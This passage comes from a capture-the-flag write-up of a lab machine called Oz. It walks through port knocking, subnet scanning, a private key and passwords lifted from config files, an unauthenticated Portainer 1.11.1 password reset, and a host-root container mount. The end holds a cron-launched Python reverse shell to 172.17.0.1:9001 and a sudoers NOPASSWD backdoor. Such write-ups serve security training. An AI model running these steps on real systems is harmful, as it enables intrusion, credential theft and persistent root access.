ENTRYPOINT ["python"]
CMD ["run.py"]

```

### SSH Port Knocking

#### Discovery

Also on tix-app is a `/.secret` hidden folder, with one file in it:

```

/.secret # cat knockd.conf 
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn

```

`knockd` is a port knocking server that allows a server to be configured to monitor (even closed ports) for activity touching certain ports in the right order, and using that as a queue to open another port for some period of time. In this case, if udp ports 40809, 50212, and 46969 are contacted in that order within 15 seconds, for the following 10 seconds, the firewall will open on port 22.

#### Connect

I put together a short bash one liner to perform this knocking, and it happened to work on the public facing Oz IP:

```

root@kali# ports="40809 50212 46969"; for port in $ports; do echo "a" | nc -u -w 1 10.10.10.96 ${port}; sleep 0.5; done; echo "knock done"; nc -w 1 -nvv 10.10.10.96 22
knock done
(UNKNOWN) [10.10.10.96] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4

```

Nice. But unfortunately, it only allows login with public key:

```

root@kali# ports="40809 50212 46969"; for port in $ports; do echo "a" | nc -u -w 1 10.10.10.96 ${port}; sleep 0.5; done; echo "knock done"; ssh dorthi@10.10.10.96
knock done
dorthi@10.10.10.96: Permission denied (publickey).

```

I’ll come back to this later.

### Subnet Enumeration

There’s a couple more files on the tix-app container that will be useful. I’ll return to those after some network enumeration. At this point, it seems obvious that I need to turn towards the local subnet to see what else is there. It looks like there are other hosts it talks to on this subnet:

```

/app # arp -na
? (10.100.10.1) at 02:42:8c:bc:93:cf [ether]  on eth0
? (10.100.10.4) at 02:42:0a:64:0a:04 [ether]  on eth0

```

I’ll do a ping sweep. Your first instinct might be to do a loop that looks like this:

```

$ for i in $(seq 1 254); do ping -c 1 10.100.10.${i} | grep "bytes from"; done;

```

And that will work, but it will take a long time (at least one second per ping).

Instead, if I put the `ping` and `grep` inside `()` and add a `&`, it will background the jobs, so that the loop finishes almost instantly, and the results all come back within a second or two. Doing so reveals four hosts (3 others and this one):

```

/app/ticketer # for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep "bytes from" &); done;
64 bytes from 10.100.10.1: seq=0 ttl=64 time=0.056 ms
64 bytes from 10.100.10.2: seq=0 ttl=64 time=0.030 ms
64 bytes from 10.100.10.4: seq=0 ttl=64 time=0.086 ms
64 bytes from 10.100.10.6: seq=0 ttl=64 time=0.498 ms

/app/ticketer # arp -na
? (10.100.10.3) at <incomplete>  on eth0
? (10.100.10.6) at 02:42:0a:64:0a:06 [ether]  on eth0
? (10.100.10.5) at <incomplete>  on eth0
? (10.100.10.1) at 02:42:8c:bc:93:cf [ether]  on eth0
? (10.100.10.4) at 02:42:0a:64:0a:04 [ether]  on eth0

```

Since .104 was the host already in the arp cache before I started pinging, I’ll start there:

```

/app/ticketer # for i in $(seq 1 65535); do nc -zvn 10.100.10.4 ${i}; done
10.100.10.4 (10.100.10.4:3306) open

```

MySQL open… looks promising.

### Database Server

Before pivoting to .104, there are a couple files on the server that give information about the database server. First, in the `/app/ticketer/` dir, there’s `database.py`:

```

/app/ticketer # cat database.py
#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask_sqlalchemy import SQLAlchemy
from . import app
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb'
db = SQLAlchemy(app)

class Users(db.Model):
    __tablename__ = 'users_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    username = db.Column('username', db.Text, nullable=False)
    password = db.Column('password', db.Text, nullable=False)

class Tickets(db.Model):
    __tablename__ = 'tickets_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    ticket_name = db.Column('name', db.String(10), nullable=False)
    ticket_desc = db.Column('desc', db.Text, nullable=False)

db.create_all()
db.session.commit()

```

Additionally, in the `/container/database/` path, there’s a `start.sh` script:

```

/containers/database # cat start.sh
#!/bin/bash

docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb \
--net prodnet --ip 10.100.10.4 \
-e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss \
-e MYSQL_USER=dorthi \
-e MYSQL_PASSWORD=N0Pl4c3L1keH0me \
-e MYSQL_DATABASE=ozdb \
-v /connect/sshkeys:/home/dorthi/.ssh/:ro \
-v /dev/null:/root/.bash_history:ro \
-v /dev/null:/root/.ash_history:ro \
-v /dev/null:/root/.sh_history:ro \
--restart=always \
mariadb:5.5

```

From these three files I’ll take the following pieces of information:
- database is hosted on 10.100.10.4
- database has a user ‘dorthi’ with password ‘N0Pl4c3L1keH0me’
- database has a user ‘root’ with password ‘SuP3rS3cr3tP@ss’
- the database container has the host system’s `/connect/sshkeys` mapped read only as `/home/dorthi/.ssh/`

And I’ll remember from the tickets above that rsa keys for ssh access are in /home/dorthi on the db container.

## Pivot to Oz - Shell As dorthi

I’ve got all the information I need now to get a shell on the main Oz host as dorthi.

### Get SSH Key

#### Connect to Database

First, I need to get the SSH key from the database server. I’ll connect with the creds I have:

```

/app/ticketer # mysql -h 10.100.10.4 -u dorthi -pN0Pl4c3L1keH0me           
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3                                                
Server version: 5.5.59-MariaDB-1~wheezy mariadb.org binary distribution
                                                                           
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.        
                                                                             
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 
                                                                           
MariaDB [(none)]>

```

There’s not much exciting in it. There’s hashes for the root and dorthi user:

```

MariaDB [mysql]> select host,user,password from user;
+-----------+--------+-------------------------------------------+
| host      | user   | password                                  |
+-----------+--------+-------------------------------------------+
| localhost | root   | *61A2BD98DAD2A09749B6FC77A9578609D32518DD |
| %         | dorthi | *43AE542A63D9C43FF9D40D0280CFDA58F6C747CA |
| %         | root   | *61A2BD98DAD2A09749B6FC77A9578609D32518DD |
+-----------+--------+-------------------------------------------+
3 rows in set (0.01 sec)

```

They won’t crack easily, but I can confirm the passwords I already have:

```

MariaDB [mysql]> select PASSWORD('N0Pl4c3L1keH0me');
+-------------------------------------------+
| PASSWORD('N0Pl4c3L1keH0me')               |
+-------------------------------------------+
| *43AE542A63D9C43FF9D40D0280CFDA58F6C747CA |
+-------------------------------------------+
1 row in set (0.00 sec)

MariaDB [(none)]> select PASSWORD('SuP3rS3cr3tP@ss');
+-------------------------------------------+
| PASSWORD('SuP3rS3cr3tP@ss')               |
+-------------------------------------------+
| *61A2BD98DAD2A09749B6FC77A9578609D32518DD |
+-------------------------------------------+
1 row in set (0.00 sec)

```

#### Read Key

I know from above that there’s a path `/home/dorthi/.ssh/` that maps to `/connect/sshkeys` on the host. I’ll use the database to grab the file.

```

/containers/database # mysql -h 10.100.10.4 -u dorthi -pN0Pl4c3L1keH0me
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2
Server version: 5.5.59-MariaDB-1~wheezy mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> select load_file("/home/dorthi/.ssh/id_rsa");
...[snip]...
| -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
 |
...[snip]...

```

### SSH as dorthi

Now I have everything I need to SSH as dorthi. I converted the port knocking onliner into a bash “get shell” script:

```

#!/bin/bash

ports="40809 50212 46969"

for port in $ports; do 
    
    echo "[*] Knocking on ${port}"
    echo "a" | nc -u -w 1 10.10.10.96 ${port}
    sleep 0.1
done; 

echo "[*] Knocking done."
echo "[*] Password:"
echo "N0Pl4c3L1keH0me"

ssh -i ~/id_rsa-oz-dorthi dorthi@10.10.10.96

```

Run it, and get a shell, and user.txt:

```

root@kali# ./ssh_dorthi.sh 
[*] Knocking on 40809
[*] Knocking on 50212
[*] Knocking on 46969
[*] Knocking done.
[*] Password:
N0Pl4c3L1keH0me
Enter passphrase for key '/root/id_rsa-oz-dorthi': 
dorthi@Oz:~$ id
uid=1000(dorthi) gid=1000(dorthi) groups=1000(dorthi)
dorthi@Oz:~$ cat user.txt 
c21cff3b...

```

## Enumerate Docker Networks

### sudo -l

One of the first things I always check in Linux privesc is `sudo -l`. In this case, dorthi has entries:

```

dorthi@Oz:/dev/shm$ sudo -l
Matching Defaults entries for dorthi on Oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on Oz:
    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls

```

### docker network ls

I can use these commands to learn about the docker network. That is certainly worth looking into. `docker network ls` will show me all the networks currently running. In this case, there’s two bridge networks:

```

dorthi@Oz:/dev/shm$ sudo /usr/bin/docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
ccdbf6314f2c        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local

```

A bridge network is a network that can be used to isolate certain docker hosts from other docker hosts. From the [docker documentation](https://docs.docker.com/network/bridge/):

> In terms of Docker, a bridge network uses a software bridge which allows
> containers connected to the same bridge network to communicate, while providing
> isolation from containers which are not connected to that bridge network. The
> Docker bridge driver automatically installs rules in the host machine so that
> containers on different bridge networks cannot communicate directly with each
> other.

I can check the `ip addr` and arp cache to see what networks are available from this host:

```

dorthi@Oz:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b2:06:0f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.96/24 brd 10.10.10.255 scope global ens32
       valid_lft forever preferred_lft forever
3: br-48148eb6a512: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:10:cb:5d:c1 brd ff:ff:ff:ff:ff:ff
    inet 10.100.10.1/29 scope global br-48148eb6a512
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:70:07:e8:47 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 scope global docker0
       valid_lft forever preferred_lft forever
...[snip]...

dorthi@Oz:/dev/shm$ arp -na                                               
? (172.17.0.2) at 02:42:ac:11:00:02 [ether] on docker0                    
? (10.10.10.2) at 00:50:56:aa:c2:6e [ether] on ens32                        
? (10.100.10.2) at 02:42:0a:64:0a:02 [ether] on br-48148eb6a512

```

### prodnet

I’ll use the other command I can `sudo`, `docker network inspect` to dig into those two bridge networks. I’ll start with prodnet:

```

dorthi@Oz:~$ sudo docker network inspect prodnet
[
    {
        "Name": "prodnet",
        "Id": "48148eb6a512cd39f249c75f7acc91e0ac92d9cc9eecb028600d76d81199893f",
        "Created": "2018-04-25T15:33:00.533183631-05:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
                {
                    "Subnet": "10.100.10.0/29",
                    "Gateway": "10.100.10.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "139ba9457f1a630ee3a072693999c414901d7df49ab8a70b926d246f9ca6cc69": {
                "Name": "webapi",
                "EndpointID": "9b1464c174ef7ea6cfadb392cc7b952944b9826bca3dc529425a30a67e8c25cc",
                "MacAddress": "02:42:0a:64:0a:06",
                "IPv4Address": "10.100.10.6/29",
                "IPv6Address": ""
            },
            "b9b370edd41a9d3ae114756d306f2502c420f48a4d7fbe36ae31bc18cf7ddb7c": {
                "Name": "ozdb",
                "EndpointID": "01e676bf59c59cce04a3f8d26cee52bcb026c45a2f02f8fa64e6d7cb4517b3d7",
                "MacAddress": "02:42:0a:64:0a:04",
                "IPv4Address": "10.100.10.4/29",
                "IPv6Address": ""
            },
            "c26a7bc669289e40144fa1ad25546f38e4349d964b7b3d4fea13e15fe5a9fb01": {
                "Name": "tix-app",
                "EndpointID": "6f706aba2f48cc52ca6a5a1e0caad843899c4f0bdc87e4e7eb51bd93f0ecfb23",
                "MacAddress": "02:42:0a:64:0a:02",
                "IPv4Address": "10.100.10.2/29",
                "IPv6Address": ""
            }
        },
        "Options": {},
        "Labels": {}
    }
]

```

That clearly describes the network I was just in with tix-app. I see the 10.100.10.0/29 subnet, and the three IPs I had identified, .2. 4. and .6.

### bridge

Turning my attention to the other network, it’s new to me:

```

dorthi@Oz:/dev/shm$ sudo docker network inspect bridge                                 
[                                                                                                                                                                                                              
    {                                                                                        
        "Name": "bridge",                                                                                                                                                                                       
        "Id": "ccdbf6314f2c3789083b08ad25934e12b92b015d5287a92fe8f8ed18cc8bed55",                                   
        "Created": "2018-11-05T08:10:02.61193715-06:00",                           
        "Scope": "local",                                                                  
        "Driver": "bridge",                                                                   
        "EnableIPv6": false,                                                                       
        "IPAM": {                                                                                                                                                                                               
            "Driver": "default",                                                          
            "Options": null,                                                                                                                                                  
            "Config": [                                                                                                                                                                                         
                {                                                         
                    "Subnet": "172.17.0.0/16",                                                                                                                                                                  
                    "Gateway": "172.17.0.1"                               
                }                                                                                                                                                                                               
            ]                                                             
        },                                                                
        "Internal": false,                                                  
        "Attachable": false,                                                   
        "Containers": {                                                                                                                                                           
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {                                                                                                                               
                "Name": "portainer-1.11.1",                                                   
                "EndpointID": "cdfd7df51d9a9c37eac6bc56b903bcbe648f46a40e9ac5071d7049453fa18e19",
                "MacAddress": "02:42:ac:11:00:02",                               
                "IPv4Address": "172.17.0.2/16",                                    
                "IPv6Address": ""                                                    
            }                                                                                                                                                                                                  
        },                                                                                                                                                                  
        "Options": {                                                              
            "com.docker.network.bridge.default_bridge": "true",                    
            "com.docker.network.bridge.enable_icc": "true",               
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }
]

```

There’s one host, called portainer-1.11.1, running on 172.17.0.2. Based on my earlier enumeration, this container doesn’t seem to be available from outside of this host.

In `/containers` on Oz, there are folder for four containers. Unfortunately, I can’t access the one for portainer as dorthi:

```

dorthi@Oz:/containers$ ls -l
total 16
drwxr-xr-x 3 root root 4096 May 25  2018 database
dr-------- 2 root root 4096 May  1  2018 portainer:1.11.1
drwxr-xr-x 4 root root 4096 May 11  2018 tix-app
drwxr-xr-x 2 root root 4096 May 22  2018 webapi

```

### Enumerating 172.17.0.2

Next I’ll see what I can learn about this new container host. Luckily for me, `nmap` is already on Oz, which makes things easier (unluckily, not with setuid bit, so no easy root there):

```

dorthi@Oz:/containers$ which nmap
/usr/bin/nmap
dorthi@Oz:/containers$ ls -l /usr/bin/nmap
-rwxr-xr-x 1 root root 2770528 Mar 31  2016 /usr/bin/nmap

```

Running `nmap` against 172.17.0.2 shows only one port open, TCP 9000:

```

dorthi@Oz:/containers$ nmap -sT -p- --min-rate 10000 172.17.0.2

Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-06 06:20 CST
Nmap scan report for 172.17.0.2
Host is up (0.00017s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds

```

The `nmap` looking for versions and running default scripts returns an unrecognized service:

```

dorthi@Oz:/containers$ nmap -p 9000 -sC -sV 172.17.0.2

Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-06 06:21 CST
Nmap scan report for 172.17.0.2
Host is up (0.00016s latency).
PORT     STATE SERVICE     VERSION
9000/tcp open  cslistener?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.01%I=7%D=1/6%Time=5C31F2C1%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,58,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRe
SF:quest,5EE,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCache-C
SF:ontrol:\x20max-age=31536000\r\nContent-Length:\x201299\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Thu,\x2005\x20Jan\
SF:x202017\x2018:56:00\x20GMT\r\nDate:\x20Sun,\x2006\x20Jan\x202019\x2012:
SF:21:21\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\"\x20ng-app=
SF:\"portainer\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<t
SF:itle>Portainer</title>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\
SF:"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20<meta\x20name=\"
SF:description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20con
SF:tent=\"Portainer\.io\">\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"css/app\.4eebaa14\.css\">\n\n\x20\x20<!--\x20HTML5\x20shim,\x20for\x2
SF:0IE6-8\x20support\x20of\x20HTML5\x20elements\x20-->\n\x20\x20<!--\[if\x
SF:20lt\x20IE\x209\]>\n\x20\x20<script\x20src=\"//html5shim\.googlecode\.c
SF:om/svn/trunk/html5\.js\"></script>\n\x20\x20<!\[endif\]-->\n\n\x20\x20<
SF:script\x20src=\"js/app\.48ab848b\.js\"></script>\n\n\x20\x20<!--\x20Fav
SF:\x20and\x20touch\x20icons\x20-->\n\x20\x20<link\x20rel=\"shortcut\x20ic
SF:on\"\x20href=\"ico/favicon\.ico\">\n\x20\x20<link\x20rel=\"apple-touch-
SF:icon-precomposed\"\x20href=\"ico/apple-t")%r(HTTPOptions,5EE,"HTTP/1\.0
SF:\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCache-Control:\x20max-age=3
SF:1536000\r\nContent-Length:\x201299\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nLast-Modified:\x20Thu,\x2005\x20Jan\x202017\x2018:56:00\
SF:x20GMT\r\nDate:\x20Sun,\x2006\x20Jan\x202019\x2012:21:21\x20GMT\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\"\x20ng-app=\"portainer\">\n<hea
SF:d>\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<title>Portainer</titl
SF:e>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20<meta\x20name=\"description\"\x20con
SF:tent=\"\">\n\x20\x20<meta\x20name=\"author\"\x20content=\"Portainer\.io
SF:\">\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/app\.4eebaa14\
SF:.css\">\n\n\x20\x20<!--\x20HTML5\x20shim,\x20for\x20IE6-8\x20support\x2
SF:0of\x20HTML5\x20elements\x20-->\n\x20\x20<!--\[if\x20lt\x20IE\x209\]>\n
SF:\x20\x20<script\x20src=\"//html5shim\.googlecode\.com/svn/trunk/html5\.
SF:js\"></script>\n\x20\x20<!\[endif\]-->\n\n\x20\x20<script\x20src=\"js/a
SF:pp\.48ab848b\.js\"></script>\n\n\x20\x20<!--\x20Fav\x20and\x20touch\x20
SF:icons\x20-->\n\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"ico/f
SF:avicon\.ico\">\n\x20\x20<link\x20rel=\"apple-touch-icon-precomposed\"\x
SF:20href=\"ico/apple-t");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.94 seconds

```

However, when I look at the strings that are coming back in the data printed by `nmap`, it’s quite clearly a web server.

I’ll confirm that by setting up a forwarder via [ssh control sequences](/cheatsheets/tunneling#ssh-support-escape-sequences) and opening it in a browser:

```

dorthi@Oz:/dev/shm$                                                       
ssh> -L 9000:172.17.0.2:9000                                              
Forwarding port.

```

![1541507629288](https://0xdfimages.gitlab.io/img/1541507629288.png)

## Privesc: dorthi –> root via Portainer.io

### Portainer.io

[Portainer.io](https://www.portainer.io/) is a product that offers that it makes Docker Management easier. It provides a GUI wrapper around Docker that allows people to interact with a complex deployment through the GUI rather than complex Docker command lines and configs.

The good news for me is that if I can gain access to the web interface, it’s just as good as being in the docker group on the box. As [I showed on Oylmpus](/2018/09/22/htb-olympus.html#root-file-system-access-via-docker-group), that’s a path to root.

### Gaining Access to Portainer

#### Research

The first thing I have to do is figure out how to log in. None of the passwords I’ve collected thus far work.

I do have a reasonable guess at the version of portainer, based on the container name, 1.11.1. Some googling for that version led me to [this issue on the portainer github](https://github.com/portainer/portainer/issues/493). It says that in version 1.11.1, you can use the api init function to set a user’s password even after one is already set without authentication.

#### httpie

As I read various documentation and examples of interacting with the portainer api, lots of people seemed to be using a tool I was not familiar with: [httpie](https://httpie.org/). In their example, they show a curl command:

```

$curl -i -X PUT httpbin.org/put -H Content-Type:application/json -d '{"hello": "world"}'

```

and the equivalent httpie command:

```

http PUT httbin.org/put hello=world

```

Seems kind of neat. Also happens to be installed on Oz:

```

dorthi@Oz:/containers$ which http
/usr/bin/http
dorthi@Oz:/containers$ http
usage: http [--json] [--form] [--pretty {all,colors,format,none}]
            [--style STYLE] [--print WHAT] [--verbose] [--headers] [--body]
            [--stream] [--output FILE] [--download] [--continue]
            [--session SESSION_NAME_OR_PATH | --session-read-only SESSION_NAME_OR_PATH]
            [--auth USER[:PASS]] [--auth-type {basic,digest}]
            [--proxy PROTOCOL:PROXY_URL] [--follow] [--verify VERIFY]
            [--cert CERT] [--cert-key CERT_KEY] [--timeout SECONDS]
            [--check-status] [--ignore-stdin] [--help] [--version]
            [--traceback] [--debug]
            [METHOD] URL [REQUEST_ITEM [REQUEST_ITEM ...]]
http: error: too few arguments

```

#### Set A Password

I’ll first show that my chosen password doesn’t work for auth:

```

dorthi@Oz:~$ http POST 172.17.0.2:9000/api/auth Username="admin" Password="df"
HTTP/1.1 422 Unprocessable Entity
Content-Length: 30
Content-Type: text/plain; charset=utf-8
Date: Tue, 06 Nov 2018 12:26:57 GMT

{"err":"Invalid credentials"}

```

Now I’ll set a new password using the `api/users/admin/init` api:

```

dorthi@Oz:~$ http POST 172.17.0.2:9000/api/users/admin/init Username="admin" Password="df"
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/plain; charset=utf-8
Date: Tue, 06 Nov 2018 12:27:11 GMT

```

And now the password works, and gives me a cookie:

```

dorthi@Oz:~$ http POST 172.17.0.2:9000/api/auth Username="admin" Password="df"
HTTP/1.1 200 OK
Content-Length: 142
Content-Type: text/plain; charset=utf-8
Date: Tue, 06 Nov 2018 12:27:18 GMT

{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTQxNTM2MDM4fQ.BHAqW2U1qjqxx7GF6rI4OZ9xq6Ma6WGWQpel3vcVPkc"}  

```

#### Log In

With the password in hand, I can also log into the GUI and see the main dashboard:

![1541508085660](https://0xdfimages.gitlab.io/img/1541508085660.png)

### System File Access as root

I’m going to create a new container of my own. The images page has a list of images available to select from:

![1546802254397](https://0xdfimages.gitlab.io/img/1546802254397.png)

I’ll use the apline one, as that’s a nice, small, clean image to work from (though others could have worked).

Back to the Dashboard, I’ll click on containers to see the ones I already know about:

![1541508099330](https://0xdfimages.gitlab.io/img/1541508099330.png)

I’ll click on the “Add container” button and get the Create container dialog. In the main section, I’ll give it a name and set the image to “python:2.7-apline”. In the Command section, I’ll make sure to check “Interactive & TTY”, since I want to interact with it.:

![1546802825707](https://0xdfimages.gitlab.io/img/1546802825707.png)

Next, in the Volumes Tab, I’ll click the “+volume” button to add a volume. Then I’ll check the “Path” button and add `/` as the path on the host, and set that to `/rootfs` in the container.

![1541507912889](https://0xdfimages.gitlab.io/img/1541507912889.png)

Now I hit “Create”, and a new container shows up in the list:

![1546803344751](https://0xdfimages.gitlab.io/img/1546803344751.png)

Now I just click on it, then on Console. Select `/bin/sh` (since alpine doesn’t have bash) and then Connect:

![1546803535861](https://0xdfimages.gitlab.io/img/1546803535861.png)

![1546803551794](https://0xdfimages.gitlab.io/img/1546803551794.png)

![1546803588056](https://0xdfimages.gitlab.io/img/1546803588056.png)

From there I can get root.txt:

![1541508032559](https://0xdfimages.gitlab.io/img/1541508032559.png)

## root Shell

Obviously I want a shell. There’s a ton of different ways to go from full file system read/write to shell. I’ll show a two.

### Cron

Create two files:
- `/rootfs/etc/cron.d/shell`:

  ```

  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  * * * * *   root    python /tmp/shell.py

  ```
- `/rootfs/tmp/shell.py`:

  ```

  import socket
  import subprocess
  import os
    
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("172.17.0.1", 9001))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  p=subprocess.call(["/bin/sh","-i"])

  ```

Start listener on Oz, and get callback as root:

```

dorthi@Oz:~$ nc -lnvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from [10.10.10.96] port 9001 [tcp/*] accepted (family 2, sport 44048)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
Oz

```

### sudoers

Editing the `/etc/sudoers` file is even easier:

```

/rootfs/etc # chmod 600 sudoers
/rootfs/etc # echo "dorthi ALL=(ALL) NOPASSWD: ALL" >> sudoers

```

Then in dorthi shell:

```

dorthi@Oz:~$ sudo -l
Matching Defaults entries for dorthi on Oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on Oz:
    (ALL) NOPASSWD: ALL
